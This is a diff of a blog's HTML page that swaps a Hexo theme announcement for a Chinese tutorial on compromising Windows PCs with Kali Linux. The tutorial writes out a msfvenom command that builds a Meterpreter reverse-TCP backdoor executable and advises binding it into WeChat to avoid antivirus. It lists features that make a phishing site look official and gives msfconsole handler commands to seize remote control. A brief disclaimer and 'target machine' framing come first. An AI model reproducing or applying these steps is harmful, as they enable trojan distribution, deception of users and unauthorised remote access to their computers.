@@ -3,27 +3,23 @@
 <html class="use-serif article-header-style-default">
 <head>
 	
-	<title>【禁止转载】BFHUI-一个好看的Hexo/WordPress主题 - BFH&#39;s Blog</title>
+	<title>如何使用KaliLinux渗透Windows电脑#1.msf生成木马渗透篇 - BFH&#39;s Blog</title>
 	<meta charset="utf-8">
 	
 		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
 	
-	<meta name="description" content="GitHub                                                   black-fruit&#x2F;theme-Hexo-BFHUI                                               A good Hexo &#x2F; Wordpress Theme">
+	<meta name="description" content="免责声明 本教程仅供参考和学习，不得用于任何犯法。否则博主一概不负责任！ 渗透前准备 下载并安装Kali Linux 到这个网站下载Kali Linux 选择64.bit版本 安装Kali Linux 安装就不用博主说了吧。网上有教程！ 配置KaliLinux 2020年的Kali Linux是不能直接使用root身份进入系统的。 解决方案是： 1.打开Bash Shell 2.输入以下代码： s">
 <meta property="og:type" content="article">
-<meta property="og:title" content="【禁止转载】BFHUI-一个好看的Hexo&#x2F;WordPress主题">
-<meta property="og:url" content="http://black-fruit.github.io/2021/02/28/BFHUI%E4%B8%80%E4%B8%AA%E5%A5%BD%E7%9C%8B%E7%9A%84Hexo-WordPress%E4%B8%BB%E9%A2%98/index.html">
+<meta property="og:title" content="如何使用KaliLinux渗透Windows电脑#1.msf生成木马渗透篇">
+<meta property="og:url" content="http://black-fruit.github.io/2021/02/18/kali-msf-1/index.html">
 <meta property="og:site_name" content="BFH&#39;s Blog">
-<meta property="og:description" content="GitHub                                                   black-fruit&#x2F;theme-Hexo-BFHUI                                               A good Hexo &#x2F; Wordpress Theme">
+<meta property="og:description" content="免责声明 本教程仅供参考和学习，不得用于任何犯法。否则博主一概不负责任！ 渗透前准备 下载并安装Kali Linux 到这个网站下载Kali Linux 选择64.bit版本 安装Kali Linux 安装就不用博主说了吧。网上有教程！ 配置KaliLinux 2020年的Kali Linux是不能直接使用root身份进入系统的。 解决方案是： 1.打开Bash Shell 2.输入以下代码： s">
 <meta property="og:locale" content="ja_JP">
-<meta property="og:image" content="http://black-fruit.github.io/2021/02/28/BFHUI%E4%B8%80%E4%B8%AA%E5%A5%BD%E7%9C%8B%E7%9A%84Hexo-WordPress%E4%B8%BB%E9%A2%98/themefm.png">
-<meta property="article:published_time" content="2021-02-28T11:22:08.000Z">
-<meta property="article:modified_time" content="2021-03-28T07:53:45.509Z">
+<meta property="article:published_time" content="2021-02-18T09:43:38.000Z">
+<meta property="article:modified_time" content="2021-03-20T13:51:01.139Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="Theme">
-<meta property="article:tag" content="Hexo">
-<meta property="article:tag" content="Wordpress">
+<meta property="article:tag" content="Kali Linux">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://black-fruit.github.io/2021/02/28/BFHUI%E4%B8%80%E4%B8%AA%E5%A5%BD%E7%9C%8B%E7%9A%84Hexo-WordPress%E4%B8%BB%E9%A2%98/themefm.png">
 
 	<meta name="theme-color" content="#FA7298">
 	<meta name="theme-color-rgb" content="250,114,152">
@@ -693,13 +689,13 @@
 	<article class="post post-full card bg-white shadow-sm border-0 post-preview">
 	<header class="post-header text-center">
 		
-		<a class="post-title" href="/2021/02/28/BFHUI%E4%B8%80%E4%B8%AA%E5%A5%BD%E7%9C%8B%E7%9A%84Hexo-WordPress%E4%B8%BB%E9%A2%98/">【禁止转载】BFHUI-一个好看的Hexo/WordPress主题</a>
+		<a class="post-title" href="/2021/02/18/kali-msf-1/">如何使用KaliLinux渗透Windows电脑#1.msf生成木马渗透篇</a>
 		<div class="post-meta">
 			
 						
 						<div class="post-meta-detail post-meta-detail-time">
 							<i class="fa fa-clock-o" aria-hidden="true"></i>
-							<time title="发布于 2021-2-28 19:22:08 | 编辑于 2021-3-28 15:53:45">2021-2-28 19:22
+							<time title="发布于 2021-2-18 17:43:38 | 编辑于 2021-3-20 21:51:01">2021-2-18 17:43
 							</time>
 						</div>
 					
@@ -708,7 +704,7 @@
 						
 						<div class="post-meta-detail post-meta-detail-categories">
 							<i class="fa fa-bookmark-o" aria-hidden="true"></i>
-							<a class="post-meta-detail-catagory-link" href="/categories/Theme/">Theme</a>
+							<a class="post-meta-detail-catagory-link" href="/categories/Kali/">Kali</a>
 						</div>
 					
 						
@@ -726,7 +722,7 @@
 						
 						<div class="post-meta-detail post-meta-detail-words">
 							<i class="fa fa-file-word-o" aria-hidden="true"></i>
-							140 字
+							178 字
 						</div>
 					
 						
@@ -742,68 +738,57 @@
 	</header>
 
 	<div class="post-content" id="post_content">
-		<center><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="themefm.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"/></center>
-
-
-<div class="github-info-card github-info-card-full card shadow-sm" data-author="black-fruit" data-project="theme-Hexo-BFHUI" githubinfo-card-id="9633114905" data-getdata="frontend" data-description="" data-stars="" data-forks=""><div class="github-info-card-header"><a href="https://github.com/" ref="nofollow" target="_blank" title="Github" no-pjax=""><span><i class="fa fa-github"></i> GitHub</span></a></div><div class="github-info-card-body">
-            <div class="github-info-card-name-a">
-                <a href="https://github.com/black-fruit/theme-Hexo-BFHUI" target="_blank" no-pjax="">
-                    <span class="github-info-card-name">black-fruit/theme-Hexo-BFHUI</span>
-                </a>
-                </div>
-            <div class="github-info-card-description">A good Hexo / Wordpress Theme  <a href="https://black-fruit.github.io/2021/02/28/BFHUI-%E4%B8%80%E4%B8%AA%E5%A5%BD%E7%9C%8B%E7%9A%84Hexo%E4%B8%BB%E9%A2%98/" target="_blank" no-pjax=""></a></div>
-        </div><div class="github-info-card-bottom">
-                <span class="github-info-card-meta github-info-card-meta-stars">
-                    <i class="fa fa-star"></i> <span class="github-info-card-stars">1080</span>
-                </span>
-                <span class="github-info-card-meta github-info-card-meta-forks">
-                    <i class="fa fa-code-fork"></i> <span class="github-info-card-forks">194</span>
-                </span>
-            </div></div>
-
-
-
-<center><p class="has-text-align-center"><a href="https://github.com/black-fruit/theme-Hexo-BFHUI" target="_blank" rel="noreferrer noopener"><i class="fa fa-github" aria-hidden="true"></i> Github – BFHUI</a> | <a href="https://bfhui.gitbook.io/bfhui-theme-dome//" target="_blank" rel="noreferrer noopener"><i class="fa fa fa-file-text-o" aria-hidden="true"></i> 文档</a> | <a href="https://github.com/black-fruit/WordPress-theme-BFHUI" target="_blank" rel="noreferrer noopener">Wordpress 移植版</a></p></center>
-
-
-
-<div class="alert alert-primary"><span class="alert-inner--icon"><i class="fa fa-info-circle"></i></span><span class="alert-inner--text">从今天开始，BFHUI-Theme 进入缓慢更新状态，只有周末才会处理问题和更新。</span></div>
-
-<h1 id="Hexo版本"><a href="#Hexo版本" class="headerlink" title="Hexo版本"></a>Hexo版本</h1><h2>下载和启用主题</h2>
-<p>转到<a href="https://github.com/black-fruit/theme-Hexo-BFHUI/releases/tag/0.0.1" target="_blank" rel="external nofollow ugc" color:"#f1f1f1"="">Releases页面</a>选择最新版本下载</p>
-<p>打开Hexo根目录下的<code>_config.yml</code>文件</p>
-<p>把<code>Theme</code>项改成下载的主题文件夹名字</p>
-<h2>配置主题</h2>
-<h3>配置主题文件</h3>
-<p>打开主题根目录下的<code>_config.yml</code>文件</p>
-<p>先转到侧栏和顶栏位置修改，然后修改gitalk项</p>
-<h3>安装npm插件</h3>
-<p>在主题根目录下启动<code>GitBash</code>输入：</p>
-<pre><code>npm install hexo-generator-search --save
+		<h1>免责声明</h1>
+<p>本教程仅供参考和学习，不得用于任何犯法。否则博主一概不负责任！</p>
+<h1>渗透前准备</h1>
+<h2>下载并安装Kali Linux</h2>
+<p>到<a href="https://www.kali.org/" target="_blank" rel="external nofollow ugc" color:"#f1f1f1"="">这个网站</a>下载Kali Linux</p>
+<p>选择64.bit版本</p>
+<h2>安装Kali Linux</h2>
+<p>安装就不用博主说了吧。网上有教程！</p>
+<h2>配置KaliLinux</h2>
+2020年的Kali Linux是不能直接使用<code>root</code>身份进入系统的。
+<p>解决方案是：</p>
+1.打开<code>Bash Shell</code>
+2.输入以下代码：
+<pre><code>sudo passwd root
+su root
 </code></pre>
-
-<h1 id="WordPress版本"><a href="#WordPress版本" class="headerlink" title="WordPress版本"></a>WordPress版本</h1><div class="shortcode-todo custom-control custom-checkbox">
-                <input class="custom-control-input" type="checkbox" checked="">
-                <label class="custom-control-label">
-                    <span>移植 BFHUI 主题到 Wordpress</span>
-                </label>
-            </div>
-<div class="progress-wrapper"><div class="progress-info"><div class="progress-label"><span>WordPress移植进度</span></div><div class="progress-percentage"><span>100%</span></div></div><div class="progress"><div class="progress-bar bg-primary" style="width: 100%;"></div></div></div>
-<h2>下载和启用主题</h2>
-<h3>下载</h3>
-<p>转到<a href="https://github.com/black-fruit/WordPress-theme-BFHUI/releases/tag/v.0.0.1" target="_blank" rel="external nofollow ugc" color:"#f1f1f1"="">Releases页面</a>选择最新版本下载</p>
-<h3>启用</h3>
-<p>转到Wordpress后台</p>
-<p>转到主题，上传我们的主题OK</p>
-
-<h1 id="Typecho版本"><a href="#Typecho版本" class="headerlink" title="Typecho版本"></a>Typecho版本</h1><div class="shortcode-todo custom-control custom-checkbox">
-                <input class="custom-control-input" type="checkbox">
-                <label class="custom-control-label">
-                    <span>移植到 Typecho（待定）</span>
-                </label>
-            </div>
-<div class="progress-wrapper"><div class="progress-info"><div class="progress-label"><span>Typecho移植进度</span></div><div class="progress-percentage"><span>0%</span></div></div><div class="progress"><div class="progress-bar bg-primary" style="width: 0%;"></div></div></div>
-
+<h2>目标靶机2个</h2>
+<p>自己安装即可</p>
+<h1>开始渗透</h1>
+<h2>1.生成木马文件</h2>
+在<code>Bash Shell</code>中输入：
+<pre><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=10.xxx.xx.11 lport=2333 -f exe -o my_back-door.exe
+</code></pre>
+<h2>木马捆绑</h2>
+<p>这时，你会发现Windows的防火墙会删除它。没关系，把它放到靶机1里，用文件捆绑捆绑在WeChat里。</p>
+捆绑软件在这里<a href="http://www.xitongzhijia.net/soft/86960.html/" target="_blank" rel="external nofollow ugc" color:"#f1f1f1"="">下载</a>
+<h2>生成钓鱼网站</h2>
+<p>以我的Blog为例，钓鱼网站要求如下：</p>
+<pre><code>必须有钓鱼软件下载按钮
+打官方的称号
+能被搜索到
+https协议
+界面像官方
+因为是靶机所以直接 http://localhost:8000 即可
+</code></pre>
+<h2>得到控制权限，开始攻击</h2>
+<h3>启动msf</h3>
+<pre><code>msfconsole
+</code></pre>
+<h3>设置msf</h3>
+<pre><code>use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 10.xxx.xx.xx
+set lport 2333
+</code></pre>
+<h3>发起会话</h3>
+<pre><code>exploit  //.第一种方法
+run      //.第二种方法
+</code></pre>
+<h2>大功告成</h2>
+<p>为了让远程连接不中断，要启动多个终端同时攻击</p>
 
 	</div>
 
@@ -821,7 +806,7 @@
 	
 		<div class="post-tags">
 			<i class="fa fa-tags" aria-hidden="true"></i>
-			<a class="tag badge badge-secondary post-meta-detail-tag -none-link" href="/tags/Hexo/" rel="tag">Hexo</a><a class="tag badge badge-secondary post-meta-detail-tag -none-link" href="/tags/Theme/" rel="tag">Theme</a><a class="tag badge badge-secondary post-meta-detail-tag -none-link" href="/tags/Wordpress/" rel="tag">Wordpress</a>
+			<a class="tag badge badge-secondary post-meta-detail-tag -none-link" href="/tags/Kali-Linux/" rel="tag">Kali Linux</a>
 		</div>
 	
 </article>
@@ -863,7 +848,7 @@
 				<span class="btn-inner--icon"><i class="fa fa-twitter"></i></span>
 			</button>
 		</a>
-		<a target="_blank" class="no-pjax icon-telegram" href="https://telegram.me/share/url?url=http://black-fruit.github.io/2021/02/28/BFHUI%E4%B8%80%E4%B8%AA%E5%A5%BD%E7%9C%8B%E7%9A%84Hexo-WordPress%E4%B8%BB%E9%A2%98/&text=【禁止转载】BFHUI-一个好看的Hexo/WordPress主题" tooltip="分享到 Telegram">
+		<a target="_blank" class="no-pjax icon-telegram" href="https://telegram.me/share/url?url=http://black-fruit.github.io/2021/02/18/kali-msf-1/&text=如何使用KaliLinux渗透Windows电脑#1.msf生成木马渗透篇" tooltip="分享到 Telegram">
 			<button class="btn btn-icon btn-primary" style="background: #42a5f5;border: none;">
 				<span class="btn-inner--icon"><i class="fa fa-telegram"></i></span>
 			</button>
@@ -880,16 +865,14 @@
 </div>
 <script type="text/javascript">
 	socialShare("#share", {
-	    title : '【禁止转载】BFHUI-一个好看的Hexo/WordPress主题',
-	    description : '
-
- GitHub
-            
-                
-          ...',
+	    title : '如何使用KaliLinux渗透Windows电脑#1.msf生成木马渗透篇',
+	    description : '免责声明
+本教程仅供参考和学习，不得用于任何犯法。否则博主一概不负责任！
+渗透前准备
+下载并安装Ka...',
 	    wechatQrcodeTitle : "分享到微信",
 	    wechatQrcodeHelper : '微信扫描二维码',
-	    source : 'http://black-fruit.github.io/2021/02/28/BFHUI%E4%B8%80%E4%B8%AA%E5%A5%BD%E7%9C%8B%E7%9A%84Hexo-WordPress%E4%B8%BB%E9%A2%98/'
+	    source : 'http://black-fruit.github.io/2021/02/18/kali-msf-1/'
 	});
 	$("#share_show")[0].onclick = function(){
 		$("#share_container").addClass("opened");
